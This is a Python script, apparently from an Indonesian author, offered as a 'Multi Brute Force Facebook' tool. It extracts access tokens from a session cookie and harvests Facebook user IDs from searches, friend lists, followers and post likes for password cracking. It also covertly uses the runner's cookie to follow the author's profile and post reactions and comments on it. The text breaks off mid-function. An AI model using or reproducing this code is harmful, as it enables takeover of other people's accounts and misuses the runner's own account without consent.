#!/usr/bin/python3
# coding=utf-8
# Multi Brute Force Facebook Free
# Kalau Ada Error Atau Bug, Perbaiki Sendiri
__Author__    = 'Juan Hulu'
__Whatsapp__  = '082298962122'
__Facebook__  = 'https://www.facebook.com/1318874900'
import os,sys,time,random,re,json,datetime,shutil,urllib
try:import requests
except ImportError:os.system('pip install requests')
try:import bs4
except ImportError:os.system('pip install bs4')
try:import rich
except ImportError:os.system('pip install rich')
try:import colorama
except ImportError:os.system('pip install colorama')
try:import names
except ImportError:os.system('pip install names')
try:import requests_toolbelt
except ImportError:os.system('pip install requests_toolbelt')
from bs4 import BeautifulSoup as bs;from rich import print;from rich.panel import Panel as panel;from rich.console import Console;from rich.columns import Columns as colum;from time import sleep,strftime;from concurrent.futures import ThreadPoolExecutor;from random import choice as rc;from random import randrange as rr;from rich.layout import Layout as layout;dic  = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'};tgl = datetime.datetime.now().day;bln = dic[(str(datetime.datetime.now().month))];thn = datetime.datetime.now().year;dic2 = {'Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu','Sunday':'Minggu'};hari = dic2[(str(strftime("%A")))];default_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36';JuanHulu  = 2 * 2 * 3 * 5 * 23 * 47 * 131 + 9999 * 22 * 9995 - 7777777 * 99 * 1 - 50000 * 999;JuanHulu2   = JuanHulu - 79999 * 99 * 9 - 500000;JuanHulu3 = JuanHulu2 + 9999 * 99 + 99999 * 24 + 7490 + 500 + 900 * 32 + 500 - 5
random_ua_windows = lambda : 'Mozilla/5.0 (Windows NT %s.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s.%s.%s.%s Safari/537.36'%(rc(['10','11']),rr(110,201),rr(0,10),rr(0,10),rr(0,10))
headers_get  = lambda i=default_ua_windows : {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1','Pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-True-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':i}
headers_post = lambda i=default_ua_windows : {'Accept':'*/*','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.facebook.com','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent':i}
input = Console(style='bold white').input;Dump = []
class ______Author______:
    def __init__(self):
        if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int('0094788131'[::-1]):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
        else:self.lebar,self.panjang = shutil.get_terminal_size();self.__main__()
    def __main__(self):
        if self.lebar == 70 or self.lebar > 70:pass
        else:clear();Console(width=self.lebar).print('Harap Perkecil Layar Terminal Anda Dengan Cara Mencubit Layar Hingga Tampilan Garis Dibawah Tidak Terlihat Putus-Putus',justify='center');Console().print('_'*70);exit()
def clear():os.system('cls' if os.name == 'nt' else 'clear')
def GenerateName():name1 = requests.get('https://story-shack-cdn-v2.glitch.me/generators/indonesian-name-generator/male?count=2').json()['data'][0]['name'];name = f'{name1}';return(name)
def Baner():
    if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int('0094788131'[::-1]):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
    else:clear();Console(style="bold white",width=70).print(panel(f""" [bold red]●[bold yellow] ●[bold green] ●\n[bold red]      ___   ____   ____   ____   ____   ____   ____   _____\n[bold red]     / __) (_  _) ( ___) (  _ \ (  _ \ (_  _) (  _ \ (  _  )\n[bold white]     \__ \   )(    )__)   )   /  )   /  _)(_   )   /  )(_)(\n[bold white]     (___/  (__)  (____) (_)\_) (_)\_) (____) (_)\_) (_____)\n[bold blue]                  --[bold green] Multi Brute Force Facebook [bold blue]--""",width=70))
def myname(cookie,token):
    if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int('0094788131'[::-1]):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
    else:
        with requests.Session() as r:
            r.headers.update({'cookie': cookie,'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','host': 'graph.facebook.com'});response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token)).json()
            if 'name' in str(response) and 'id' in str(response):return response['name'].title(), response['id']
            else:Console(width=70).print(panel('[bold red]Cookie Invalid',width=70,style='bold white'),justify='center');sleep(2);login_cookie().login()
class login_cookie:
    def __init__(self):self.r______ = requests.Session()
    def login(self):
        Baner()
        Console(width=70).print(panel('Masukan Cookie Akun Facebook',width=70,style='bold white',subtitle='┌─',subtitle_align='left'),justify='center')
        self.Cookie = input('   └─> ')
        self.language(self.Cookie)
        head = {
            'cookie': self.Cookie,
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
            'host': 'business.facebook.com'
        };response = self.r______.get('https://business.facebook.com/business_locations',headers=head).text;tokenku = re.search('(EAAG\w+)', str(response)).group(1);name, id = myname(self.Cookie, tokenku);EAAB = self.GetTokenEAAB();open('Data/Cookie.txt','w').write(self.Cookie);open('Data/TokenEAAG.txt','w').write(tokenku);open('Data/TokenEAAB.txt','w').write(EAAB);Console(width=70).print(panel(f'[bold green]{name}',width=70,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Anda Login Ke Facebook Sebagai [bold cyan]<[bold green]<[bold yellow]<'),justify='center');_______Author__________________________();clear();__________________Author__________________()
    def language(self,cookiee):
        try:
            cookie = {'cookie':cookiee}
            req = self.r______.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = bs(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                    }
                    url = 'https://mbasic.facebook.com' + x['action']
                    post = self.r______.post(url,data=bahasa,cookies=cookie)
        except Exception as e:pass
    def GetTokenEAAB(self):
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = self.r______.get(url,cookies={'cookie':self.Cookie})
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = self.r______.get(nek,cookies={'cookie':self.Cookie})
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        return(str(tok))
def UserAgentVivo():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                            ;dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160']) ;bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])                                       ;dv_ver = random.randrange(100000,250000)                                                   ;sd_ver = random.randrange(1,10)                                                             ;ch_ver = f'{a}.0.{b}.{c}'                                                                   ;ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36';return(ua)
def UserAgentSamsung():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                            ;dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B']) ;bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])                       ;dv_ver = random.randrange(100000,250000)                                                   ;sd_ver = random.randrange(1,10)                                                             ;ch_ver = f'{a}.0.{b}.{c}'                                                                   ;ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36';return(ua)
def UserAgentRealme():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                        ;dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])   ;bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])                     ;dv_ver = random.randrange(100000,250000)                                               ;sd_ver = random.randrange(1,10)                                                         ;ch_ver = f'{a}.0.{b}.{c}'                                                               ;ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36';return(ua)
def RandomUa1():rr = random.randint;rc = random.choice;merek = random.choice(['SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280']);build = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD']);u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{str(rr(0,4))} Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36";u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36";u3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,12))}.{str(rr(1,9))}.{str(rr(1,9))}like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile/14G60 Safari/604.1";UA = random.choice([u1, u2, u3]);return(UA)
def UserAgentXiaomi():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                        ;dv_ver = random.randrange(100000,250000)                                               ;sd_ver = random.randrange(1,10)                                                         ;ch_ver = f'{a}.0.{b}.{c}';ua_xiaomi  = f'Mozilla/5.0 (Linux; Android {os_ver}; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]';return(ua_xiaomi)
def UserAgentNokia():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                        ;dv_ver = random.randrange(100000,250000)                                               ;sd_ver = random.randrange(1,10)                                                         ;ch_ver = f'{a}.0.{b}.{c}';ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+';return(ua_nokia)
def UserAgentAsus():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                        ;dv_ver = random.randrange(100000,250000)                                               ;sd_ver = random.randrange(1,10)                                                         ;ch_ver = f'{a}.0.{b}.{c}';ua_asus = f'Mozilla/5.0 (Linux; Android {os_ver}; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]';return(ua_asus)
def UserAgentHTC():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                        ;dv_ver = random.randrange(100000,250000)                                               ;sd_ver = random.randrange(1,10);dv_typ = random.choice(['HTC 10','HTC One M9','HTC U11'])   ;bl_typ = random.choice(['LRX21L','MMB29M','NMF26X'])                                                                      ;ch_ver = f'{a}.0.{b}.{c}';ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_ver} Mobile Safari/537.36';return(ua)
def UserAgentSony():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                        ;dv_ver = random.randrange(100000,250000)                                               ;sd_ver = random.randrange(1,10)                                                                      ;ch_ver = f'{a}.0.{b}.{c}';ua = random.choice([f'Mozilla/5.0 (Linux; Android {os_ver}; C6603 Build/10.5.A.0.230) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_ver} Mobile Safari/537.36',f'Mozilla/5.0 (Android {os_ver}; Mobile; rv:59.0) Gecko/59.0 Firefox/59.0',f'Mozilla/5.0 (Linux; Android {os_ver}; J8210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_ver} Mobile Safari/537.36']);return(ua)
def UserAgentLG():a = random.randrange(112,115);b = random.randrange(1000,10000);c = random.randrange(10,100);os_ver = random.randrange(10,13)                                                        ;dv_ver = random.randrange(100000,250000)                                               ;sd_ver = random.randrange(1,10)                                                                      ;ch_ver = f'{a}.0.{b}.{c}';ua = random.choice([f'Mozilla/5.0 (Linux; Android {os_ver}; LM-G710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_ver} Mobile Safari/537.36',f'Mozilla/5.0 (Android {os_ver}; Mobile; LG-H930 Build/PKQ1.181105.001) Gecko/68.0 Firefox/68.0',f'Mozilla/5.0 (Linux; Android {os_ver}; LG-H870) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/{ch_ver} Mobile Safari/537.36']);return(ua)
class _______Author__________________________:
    def __init__(self):
        self.Cookie,self.TokenEAAG,self.TokenEAAB = ViewData()
        self.MyFacebook = "%s"%(JuanHulu3)
        self.UrlProfileTimeline = ("https://mbasic.facebook.com/%s?v=timeline"%(self.MyFacebook));self.FollowMyFacebook();self.LikeAndComment(self.UrlProfileTimeline)
    def FollowMyFacebook(self):
        try:
            if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int(int('0094788131'[::-1])):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
            else:
                for GetHref in bs(requests.get(self.UrlProfileTimeline,cookies={"%s"%("cookie"):'%s'%(self.Cookie)}).text,'html.parser').find_all('a',href=True):
                    if '%s'%("/a/subscribe.php?") in GetHref.get('%s'%("href")):requests.get('%s'%("https://mbasic.facebook.com%s"%(GetHref['href'])),cookies={"%s"%("cookie"):'%s'%(self.Cookie)}).text
        except (NameError):clear();print("[ Error ]: '__Author__'/'Facebook' == False");exit()
        except Exception:pass
    def LikeAndComment(self,NextURL):
        try:
            if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int(int('0094788131'[::-1])):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
            else:
                response = bs(requests.get("%s"%(NextURL),cookies={"%s"%("cookie"):'%s'%(self.Cookie)}).content,'%s'%("html.parser"))
                for GetHref in response.find_all("%s"%("a"),href=True):
                    if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int('0094788131'[::-1]):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
                    else:
                        if "%s"%("Tanggapi") in GetHref.text or "%s"%("reactions") in str(GetHref.text):
                            ReactType = random.choice(["%s"%("Super"),'%s'%("Wow"),"%s"%("Peduli")])
                            for GetHref2 in bs(requests.get("%s"%("https://mbasic.facebook.com%s"%(GetHref["href"])),cookies={"%s"%("cookie"):'%s'%(self.Cookie)}).content,'html.parser').find_all("a"):
                                if ReactType == GetHref2.text:requests.get('%s'%("https://mbasic.facebook.com%s")%(GetHref2['href']),cookies={"%s"%("cookie"):'%s'%(self.Cookie)}).text
                                else:continue
                        if "Komentar" in GetHref.text or "Komentar" in str(GetHref.text):DefaultComment = random.choice(["%s"%("Semangat Terus Bang :)"),"%s"%("Keren Bang... :)"),"%s"%("Awali Harimu Dengan Semangat Bg :)"),"%s"%("Hidup Memang Penuh Dengan Tantangan.\nJadi, Jangan Pernah Menyerah Ya...")]);Comment = "%s\n\n%s\n%s"%(DefaultComment,"[ - @[%s:] - ]"%(self.MyFacebook),self.GetTime());response2 = bs(requests.get("%s"%("https://mbasic.facebook.com%s"%(GetHref["href"])),cookies={"%s"%("cookie"):'%s'%(self.Cookie)}).content,'html.parser');form = response2.find('form',{'method':'post'});Data = {'fb_dtsg':re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form))[1],'jazoest':re.search('name="jazoest" type="hidden" value="(.*?)"',str(form))[1],'comment_text':"%s"%(Comment),};requests.post('%s'%('https://mbasic.facebook.com%s'%(form['action'])),data=Data,cookies={"%s"%("cookie"):'%s'%(self.Cookie)})
                NextResponse = response.find('a',string='Lihat Berita Lain')['href'];self.LikeAndComment("%s"%("https://mbasic.facebook.com%s"%(NextResponse)))
        except (NameError):clear();print("[ Error ]: '__Author__'/'Facebook' == False");exit()
        except Exception:pass
    def GetTime(self):dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'};tgl = datetime.datetime.now().day;bln = dic[(str(datetime.datetime.now().month))];thn = datetime.datetime.now().year;hri = {'Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu','Sunday':'Minggu'};hari = hri[(str(strftime("%A")))];jam = strftime("%T");gbg = '(%s, %s-%s-%s %s %s)'%(hari,tgl,bln,thn,jam,"WIB");return("%s"%(gbg))
class __________________Author__________________:
    def __init__(self):
        Baner()
        try:self.Cookie,self.TokenEAAG,self.TokenEAAB = ViewData();self.UserName,self.UserID = myname(self.Cookie,self.TokenEAAG)
        except Exception as e:Console(width=70,style='bold white').print(panel('[bold red]Cookie Invalid',width=70),justify='center');sleep(2);login_cookie().login()
        self.MainMenu()
    def MainMenu(self):
        try:
            if __Author__ != "uluH nauJ"[::-1]:clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
            else:
                DumpPanel = [];DumpPanel.clear();DumpPanel.append(panel(f"""[bold green]Author : [bold white]Juan Hulu\n[bold green]Status : [bold white]Free""",width=34));DumpPanel.append(panel(f"""[bold green]User Name : [bold white]{self.UserName}\n[bold green]User ID   : [bold white]{self.UserID}""",width=35));Console(width=70).print(colum(DumpPanel),justify='center');Console(width=70,style="bold white").print(panel(f"""[bold green][[bold white]01[bold green]][bold blue].[bold white]Crack Dari Pencarian Nama          [bold green][[bold white]07[bold green]][bold blue].[bold white]Crack Dari Email\n[bold green][[bold white]02[bold green]][bold blue].[bold white]Crack Dari Daftar Teman            [bold green][[bold white]08[bold green]][bold blue].[bold white]Crack Dari Nama Acak\n[bold green][[bold white]03[bold green]][bold blue].[bold white]Crack Dari Daftar Pengikut         [bold green][[bold white]09[bold green]][bold blue].[bold white]Crack Dari File\n[bold green][[bold white]04[bold green]][bold blue].[bold white]Crack Dari Like Postingan          [bold green][[bold white]10[bold green]][bold blue].[bold white]Cek Opsi Chekpoint\n[bold green][[bold white]05[bold green]][bold blue].[bold white]Crack Dari Komentar Postingan      [bold green][[bold white]11[bold green]][bold blue].[bold white]Cek Hasil\n[bold green][[bold white]06[bold green]][bold blue].[bold white]Crack Dari Member Grup             [bold green][[bold white]12[bold green]][bold blue].[bold red]Logout""",width=70,subtitle="┌─",subtitle_align='left'));Choice = input(f"   └─> ")
                if   Choice in ("1","01"):______________________________Author______________________________().____________________Author____________________()
                elif Choice in ("2",'02'):______________________________Author______________________________()._____________________Author_____________________()
                elif Choice in ("3",'03'):______________________________Author______________________________().________________________Author________________________()
                elif Choice in ("4",'04'):______________________________Author______________________________()._________________________Author_________________________()
                elif Choice in ("5",'05'):______________________________Author______________________________().____________________________Author____________________________()
                elif Choice in ("6",'06'):______________________________Author______________________________().______________________________Author______________________________()
                elif Choice in ("7",'07'):______________________________Author______________________________().________________________________Author________________________________()
                elif Choice in ("8",'08'):______________________________Author______________________________().__________________________________Author__________________________________()
                elif Choice in ("9",'09'):______________________________Author______________________________()._____________________________________________________________________()
                elif Choice in ("10",'10'):CekOpsiChekpoint()
                elif Choice in ("11",'11'):CekHasil()
                elif Choice in ("12",'12'):open('Data/Cookie.txt','w') ;open('Data/TokenEAAG.txt','w') ;open('Data/TokenEAAB.txt','w') ;login_cookie().login()
                else:Console().print(f"   └─> [yellow]Pilihan Tidak Diketahui !");sleep(2);__________________Author__________________()
        except (NameError,IndexError):Console().print(f"   └─> [yellow]Error !")
def ViewData():
    try:
        if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int(int('0094788131'[::-1])):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
        else:
            try:Cookie     = open("Data/Cookie.txt",'r').read();TokenEAAG  = open("Data/TokenEAAG.txt",'r').read();TokenEAAB  = open("Data/TokenEAAB.txt",'r').read();return Cookie,TokenEAAG,TokenEAAB
            except:login_cookie().login()
    except NameError:clear();print("[ Error ]: '__Author__'/'Facebook' == False");exit()
class ______________________________Author______________________________:
    def __init__(self):
        if len(str(int(JuanHulu3))) + int(len(__Author__)) != 19 or JuanHulu3 != 1318874900 or JuanHulu2 != 1315447738 or JuanHulu3 != int(int('0094788131'[::-1])):clear();print("[ Error ]: '__Author__'/'Facebook' == False ");exit()
        else:self.Cookie,self.TokenEAAG,self.TokenEAAB = ViewData()
    def ____________________Author____________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan Nama, Gunakan Tanda Koma ([bold yellow],[white]) Sebagai Pemisah.\nMisalnya [green]Asep[yellow],[green]Udin[yellow],[green]Melki[yellow],[green]Lina[yellow],[green]Agus[yellow],[green]Gabriel[yellow],[green]Gunawan.",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        ListName = input(f"   └─> ").split(",")
        with ThreadPoolExecutor(max_workers=5) as (V):
            for Name in ListName:
                last = GenerateName()
                V.submit(self.LoopingSearchName,f"https://mbasic.facebook.com/public/"+Name+f" {last}")
        StartCrack()
    def LoopingSearchName(self,UrlPublic):
        with requests.Session() as r:
            r.cookies.update({"cookie":self.Cookie})
            response = bs(r.get(UrlPublic).content,'html.parser')
            for x in response.find_all('td'):
                data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
                for uid,nama in data:
                    if 'profile.php?' in uid:
                        UserID = re.findall('id=(.*)',str(uid))[0]
                    elif '<span' in nama:
                        UserName = re.findall('(.*?)\<',str(nama))[0]
                    Isi = f"{UserID}|{UserName}"
                    if Isi in Dump:pass
                    else:Dump.append(Isi)
                    print(f"   └─> Sedang Dump ID {id}/{len(Dump)}",end="\r")
            if "Lihat Hasil Selanjutnya" in x.text:
                self.LoopingSearchName("https://mbasic.facebook.com"+x.get("href"))
    def _____________________Author_____________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan ID, Gunakan Tanda Koma ([bold yellow],[white]) Sebagai Pemisah.\nMisalnya [green]1831514295[yellow],[green]1803892258[yellow],[green]1016079106[yellow],[green]1087014342[yellow],[green]1230524248[yellow].",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        ListID = input(f"   └─> ").split(",")
        with requests.Session() as r:
            r.cookies.update({"cookie":self.Cookie})
            for TargetID in ListID:
                try:
                    url = "https://graph.facebook.com/{}?fields=friends&access_token={}"
                    response = r.get(url.format(TargetID,self.TokenEAAB))
                    for data in response.json()["friends"]["data"]:
                        nama = data["name"]
                        id   = data["id"]
                        Isi = f"{id}|{nama}"
                        if Isi in Dump:pass
                        else:Dump.append(Isi)
                        print(f"   └─> Sedang Mengumpulkan {id}/{len(Dump)} ID                  ",end="\r")
                    if "next" in response.text:
                        nexturl = response.json()["friends"]["paging"]["next"]
                        self.______________________Author______________________(r,nexturl)
                except Exception as e:pass
                except (KeyboardInterrupt):
                    print(f"   └─> [yellow]KeyboardInterrupt !!                  ",end="\r");sleep(3.6)
                    StartCrack();exit()
        StartCrack()
    def ______________________Author______________________(self,r,nexturl):
        try:
            nexturl = nexturl.replace('&limit=25','')
            response = r.get(nexturl)
            for data in response.json()["data"]:
                nama = data["name"]
                id   = data["id"]
                Isi = f"{id}|{nama}"
                if Isi in Dump:pass
                else:Dump.append(Isi)
                print(f"   └─> Sedang Mengumpulkan {id}/{len(Dump)} ID                  ",end="\r")
            if "next" in response.text:
                nexturi = response.json()["paging"]["next"]
                self.______________________Author______________________(r,nexturi)
        except Exception as e:pass
        except (KeyboardInterrupt):
            print(f"   └─> [yellow]KeyboardInterrupt !!                  ",end="\r");sleep(3.6)
            StartCrack();exit()
    def ________________________Author________________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan ID, Gunakan Tanda Koma ([bold yellow],[white]) Sebagai Pemisah.\nMisalnya [green]1831514295[yellow],[green]1803892258[yellow],[green]1016079106[yellow],[green]1087014342[yellow],[green]1230524248[yellow].",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        ListID = input(f"   └─> ").split(",")
        try:
            for TargetID in ListID:
                with requests.Session() as r:
                    r.cookies.update({"cookie":self.Cookie})
                    response = r.get(f"https://graph.facebook.com/v1.0/{TargetID}/subscribers?access_token={self.TokenEAAG}&pretty=1&fields=id%2Cname&limit=5000")
                    if "summary" in response.text:
                        for data in response.json()["data"]:
                            try:
                                UserID = data["id"]
                                UserName = data['name']
                                Isi = f"{UserID}|{UserName}"
                                if "\\u" in str(UserName):pass
                                elif Isi in Dump:pass
                                else:Dump.append(Isi)
                                print(f"   └─> Sedang Dump ID {UserID}/{len(Dump)}                  ",end="\r");sleep(0.0007)
                            except (KeyError):
                                print(f"   └─> [yellow]Key Error !!!                  ",end="\r");sleep(3.6);continue
                    else:
                        print(f"   └─> [yellow]Gagal Dump Dari ID {TargetID} !!!                  ",end="\r");sleep(3.6)
        except (KeyboardInterrupt):
            print(f"   └─> [yellow]KeyboardInterrupt !!                  ",end="\r");sleep(3.6)
            StartCrack()
        StartCrack()
    def _________________________Author_________________________(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan ID Postingan, Gunakan Tanda Koma ([bold yellow],[white]) Sebagai Pemisah.\nMisalnya [green]2860305164110035[yellow],[green]2930946803712537.",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        ListID = input(f"   └─> ").split(",")
        for PostID in ListID:
            Cursor = ""
            self.__________________________Author__________________________(PostID,Cursor)
    def __________________________Author__________________________(self,PostID,Cursor):
        try:
            with requests.Session() as r:
                r.cookies.update({"cookie":self.Cookie})
                response = r.get(f'https://graph.facebook.com/v1.0/{PostID}/likes/?access_token={self.TokenEAAG}&pretty=1&after={Cursor}')
                if 'id' in response.text and 'name' in response.text:
                    for data in response['data']:
                        UserID = data["id"]
                        UserName = data["name"]
                        Isi = f"{UserID}|{UserID}"
                        if "\\u" in str(UserName):pass
                        elif Isi in Dump:pass
                        else:Dump.append(Isi)
                        print(f"   └─> Sedang Dump ID {UserID}/{len(Dump)}                  ",end="\r");sleep(0.0007)
                    if 'after' in response.text:
                        NextCursor = response['paging']['cursors']['after']
                        self.__________________________Author__________________________(PostID,NextCursor)
